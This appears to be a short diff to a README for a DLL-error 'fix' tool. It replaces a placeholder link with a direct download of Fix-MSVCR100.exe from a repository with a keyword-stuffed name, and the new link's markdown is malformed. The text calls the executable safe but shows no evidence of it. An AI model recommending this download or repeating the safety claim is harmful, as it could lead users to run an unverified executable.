@@ -26,7 +26,7 @@ We built a safe `.exe` utility that:
 - Supports both x64 and x86 systems
 - Prompts for reboot after installation
 
-📥 [Download Fix-MSVCR100.exe](https://github.com/YOUR_USERNAME/YOUR_REPO/releases/latest/download/Fix-MSVCR100.exe)
+📥 [Download Fix-MSVCR100.exe]([https://github.com/MSVCR100dll/dll-msvcr100dll-download-msvcr100/releases/download/v1.0.0/Fix-MSVCR100.exe)
 
 > The EXE was compiled from an open PowerShell script. You can review [Fix-MSVCR100.ps1](./Fix-MSVCR100.ps1) to verify it.
 
